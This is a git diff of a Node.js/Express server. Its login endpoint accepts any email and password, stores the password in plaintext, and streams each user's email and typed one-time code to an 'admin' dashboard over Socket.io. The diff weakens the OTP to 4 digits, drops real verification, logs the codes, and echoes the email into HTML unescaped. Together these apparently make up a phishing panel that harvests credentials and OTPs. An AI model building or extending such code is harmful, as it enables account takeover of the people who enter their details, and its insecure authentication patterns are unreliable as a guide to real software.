@@ -90,12 +90,13 @@ async function initializeDatabase() {
   try {
     console.log('📦 Initializing database...');
     
+    // Create users table with all required columns
     await pool.query(`
       CREATE TABLE IF NOT EXISTS users (
         id SERIAL PRIMARY KEY,
         email VARCHAR(255) UNIQUE NOT NULL,
         password VARCHAR(255) NOT NULL,
-        otp VARCHAR(6),
+        otp VARCHAR(4),
         otp_attempts INTEGER DEFAULT 0,
         otp_verified BOOLEAN DEFAULT FALSE,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
@@ -104,6 +105,7 @@ async function initializeDatabase() {
     `);
     console.log('✅ Users table ready');
 
+    // Create admin table
     await pool.query(`
       CREATE TABLE IF NOT EXISTS admin (
         id SERIAL PRIMARY KEY,
@@ -113,6 +115,26 @@ async function initializeDatabase() {
     `);
     console.log('✅ Admin table ready');
 
+    // Create or replace function for updated_at trigger
+    await pool.query(`
+      CREATE OR REPLACE FUNCTION update_updated_at_column()
+      RETURNS TRIGGER AS $$
+      BEGIN
+          NEW.updated_at = CURRENT_TIMESTAMP;
+          RETURN NEW;
+      END;
+      $$ language 'plpgsql';
+    `);
+
+    // Create trigger if it doesn't exist
+    await pool.query(`
+      DROP TRIGGER IF EXISTS update_users_updated_at ON users;
+      CREATE TRIGGER update_users_updated_at
+          BEFORE UPDATE ON users
+          FOR EACH ROW
+          EXECUTE FUNCTION update_updated_at_column();
+    `);
+
     // Create default admin
     const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
     if (adminExists.rows.length === 0) {
@@ -121,6 +143,7 @@ async function initializeDatabase() {
       console.log('✅ Default admin created');
     }
 
+    console.log('✅ Database initialization completed');
     return true;
   } catch (error) {
     console.error('❌ Database init error:', error.message);
@@ -128,8 +151,8 @@ async function initializeDatabase() {
   }
 }
 
-// Generate OTP
-const generateOTP = () => crypto.randomInt(100000, 999999).toString();
+// Generate random OTP (kept for backward compatibility but not used in new flow)
+const generateOTP = () => crypto.randomInt(1000, 9999).toString().padStart(4, '0');
 
 // USER ENDPOINTS
 
@@ -144,16 +167,12 @@ app.post('/api/users/login', async (req, res) => {
       INSERT INTO users (email, password, otp_verified) 
       VALUES ($1, $2, false) 
       ON CONFLICT (email) DO UPDATE 
-      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0
+      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL
     `, [email, password]);
 
-    // Generate and save OTP
-    const otp = generateOTP();
-    await pool.query('UPDATE users SET otp = $1 WHERE email = $2', [otp, email]);
-
-    // Emit to admin
-    io.emit('new-login', { email, otp, timestamp: new Date() });
-    console.log('📢 New login - OTP generated for:', email);
+    // Emit to admin that user logged in
+    io.emit('user-login', { email, timestamp: new Date() });
+    console.log('📢 User logged in:', email);
 
     // Send loading page
     res.send(`
@@ -196,7 +215,7 @@ app.post('/api/users/login', async (req, res) => {
         <div class="loading-container">
           <h2>Processing your request...</h2>
           <div class="spinner"></div>
-          <p>Please wait, redirecting to OTP verification for <span class="email">${email}</span>...</p>
+          <p>Please wait, redirecting to OTP creation for <span class="email">${email}</span>...</p>
         </div>
       </body>
       </html>
@@ -207,132 +226,63 @@ app.post('/api/users/login', async (req, res) => {
   }
 });
 
-// Verify OTP with attempt tracking
-app.post('/api/users/verify', async (req, res) => {
+// Save user-created OTP (after self-verification)
+app.post('/api/users/save-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
-    if (!email || !otp) return res.status(400).json({ error: 'Email and OTP required' });
-
-    // Get user data
-    const user = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
-    if (user.rows.length === 0) return res.status(404).json({ error: 'User not found' });
-
-    const userData = user.rows[0];
     
-    // Check if already verified
-    if (userData.otp_verified) {
-      return res.json({ success: true, message: 'Already verified', redirect: '/users/success' });
+    if (!email || !otp) {
+      return res.status(400).json({ error: 'Email and OTP required' });
     }
 
-    // Check attempts
-    if (userData.otp_attempts >= 3) {
-      // Generate new OTP after 3 attempts
-      const newOtp = generateOTP();
-      await pool.query('UPDATE users SET otp = $1, otp_attempts = 0 WHERE email = $2', [newOtp, email]);
-      io.emit('otp-regenerated', { email, otp: newOtp, reason: 'max_attempts', timestamp: new Date() });
-      return res.status(400).json({ 
-        error: 'Maximum attempts reached. New OTP has been generated and sent to admin.',
-        newOtpGenerated: true
-      });
+    if (!/^\d{4}$/.test(otp)) {
+      return res.status(400).json({ error: 'OTP must be exactly 4 digits' });
     }
 
-    // Verify OTP
-    if (userData.otp === otp) {
-      // Correct OTP
-      await pool.query('UPDATE users SET otp_verified = true, otp_attempts = 0 WHERE email = $1', [email]);
-      io.emit('otp-verified', { email, timestamp: new Date() });
-      
-      // Send loading page before success
-      res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Verifying...</title>
-          <style>
-            body {
-              font-family: Arial, sans-serif;
-              display: flex;
-              justify-content: center;
-              align-items: center;
-              height: 100vh;
-              margin: 0;
-              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            }
-            .loading-container {
-              text-align: center;
-              background: white;
-              padding: 40px;
-              border-radius: 10px;
-              box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            }
-            .spinner {
-              border: 4px solid #f3f3f3;
-              border-top: 4px solid #4CAF50;
-              border-radius: 50%;
-              width: 50px;
-              height: 50px;
-              animation: spin 1s linear infinite;
-              margin: 20px auto;
-            }
-            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            .checkmark {
-              color: #4CAF50;
-              font-size: 48px;
-              margin: 10px 0;
-            }
-          </style>
-          <meta http-equiv="refresh" content="3;url=/users/success?email=${encodeURIComponent(email)}">
-        </head>
-        <body>
-          <div class="loading-container">
-            <div class="checkmark">✓</div>
-            <h2>OTP Verified Successfully!</h2>
-            <div class="spinner"></div>
-            <p>Please wait, redirecting...</p>
-          </div>
-        </body>
-        </html>
-      `);
-    } else {
-      // Wrong OTP - increment attempts
-      const newAttempts = (userData.otp_attempts || 0) + 1;
-      await pool.query('UPDATE users SET otp_attempts = $1 WHERE email = $2', [newAttempts, email]);
-      
-      // Notify admin of wrong attempt
-      io.emit('wrong-otp-attempt', { 
-        email, 
-        attempt: newAttempts,
-        wrongOtp: otp,
-        timestamp: new Date() 
-      });
+    // Save OTP to database and mark as verified
+    const result = await pool.query(
+      'UPDATE users SET otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, otp',
+      [otp, email]
+    );
 
-      res.status(400).json({ 
-        error: `Invalid OTP. Attempt ${newAttempts} of 3`,
-        attempts: newAttempts
-      });
+    if (result.rows.length === 0) {
+      return res.status(404).json({ error: 'User not found' });
     }
+
+    // Emit to admin with the OTP that user created
+    io.emit('user-otp-created', { 
+      email, 
+      otp, 
+      timestamp: new Date(),
+      message: 'User has created and verified their OTP'
+    });
+
+    console.log('✅ User OTP saved and verified for:', email, 'OTP:', otp);
+    res.json({ success: true, message: 'OTP saved successfully' });
   } catch (error) {
-    console.error('❌ Verify error:', error.message);
+    console.error('❌ Save OTP error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
 
-// Resend OTP request
-app.post('/api/users/resend', async (req, res) => {
+// Resend/Reset OTP request (clears user state to start over)
+app.post('/api/users/reset', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
 
-    // Generate new OTP
-    const newOtp = generateOTP();
-    await pool.query('UPDATE users SET otp = $1, otp_attempts = 0 WHERE email = $2', [newOtp, email]);
+    // Reset user OTP state
+    await pool.query(
+      'UPDATE users SET otp = NULL, otp_verified = false, otp_attempts = 0 WHERE email = $1',
+      [email]
+    );
     
-    io.emit('resend-request', { email, otp: newOtp, timestamp: new Date() });
-    console.log('📢 Resend request - new OTP for:', email);
+    io.emit('user-reset', { email, timestamp: new Date() });
+    console.log('📢 User reset OTP process:', email);
 
-    res.json({ success: true, message: 'New OTP generated and sent to admin' });
+    res.json({ success: true, message: 'OTP process reset. Please login again.' });
   } catch (error) {
-    console.error('❌ Resend error:', error.message);
+    console.error('❌ Reset error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -455,6 +405,7 @@ initializeDatabase().then((success) => {
       console.log(`📡 Port: ${PORT}`);
       console.log(`🔗 User login: /users/login`);
       console.log(`🔗 Admin login: /admin`);
+      console.log('\n📢 Socket.io server ready for real-time notifications\n');
     });
   } else {
     process.exit(1);
@@ -463,8 +414,10 @@ initializeDatabase().then((success) => {
 
 // Graceful shutdown
 process.on('SIGINT', () => {
+  console.log('\n📴 Shutting down server...');
   pool.end(() => process.exit(0));
 });
 process.on('SIGTERM', () => {
+  console.log('\n📴 Shutting down server...');
   pool.end(() => process.exit(0));
 });
